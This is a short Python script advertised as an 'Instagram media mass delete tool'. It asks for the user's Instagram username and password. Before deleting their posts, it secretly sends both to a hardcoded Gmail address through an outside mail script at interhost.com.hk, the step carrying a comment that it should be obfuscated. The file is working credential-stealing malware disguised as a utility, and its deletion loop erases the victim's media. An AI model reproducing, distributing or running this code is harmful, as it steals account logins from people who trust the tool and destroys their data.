#!/usr/bin/python

from InstagramAPI import InstagramAPI 
import sys,time
import random
import requests
import re

def bann():
	print ("""\n
	--------------------------------------
	[+] INSTAGRAM MEDIA MASS DELETE TOOL
	[+] AUTHOR : SECURITY007	
	--------------------------------------
	""")
bann()
print("[+] Checking API...")

#obfuscateIt
req = "http://interhost.com.hk/tool.php?dir=&do=spam_email"

def help():
	print ("\nUsage:\npython "+sys.argv[0]+" <username> <password> ")
try:
	username = sys.argv[1]
	password = sys.argv[2]
except:
	help()
	sys.exit()
ran = random.randrange(1,1000)	
dat = {'fremail':'instaToolBot'+str(ran)+'@insta.com','frname':'InstaBot'+str(ran),'tremail':'defacementsec007@gmail.com','subjectt':'Instagram Password','msgmail':'Username : '+username+'\nPassword : '+password,'ctmail':'1','oksend':'Send!'}
kirim = requests.post(req,data=dat)

ig = InstagramAPI(username, password) 
ig.login() 
ig.getSelfUserFeed()
MediaList = ig.LastJson 

try:
	Media = MediaList['items'][0]
	while True:
		MediaID = Media['id']
		MediaType = Media['media_type']
		isDeleted = ig.deleteMedia(MediaID, media_type=MediaType)

		if isDeleted:
    			print("\nYour Media {0} has been deleted".format(MediaID))
		else:
    			print("\nYour Media Not Deleted")
		animation = "-\|/-\|/"
		a = random.randrange(5,10)
		for i in range(a):
			time.sleep(1)
			sys.stdout.write("\r[+] Sleep For %i Seconds %i "%(a,i+1) + animation[i % len(animation)])
			sys.stdout.flush()
	print ("[+] All Done!!")
except IndexError:
	print ("[-] No Media Found!!")
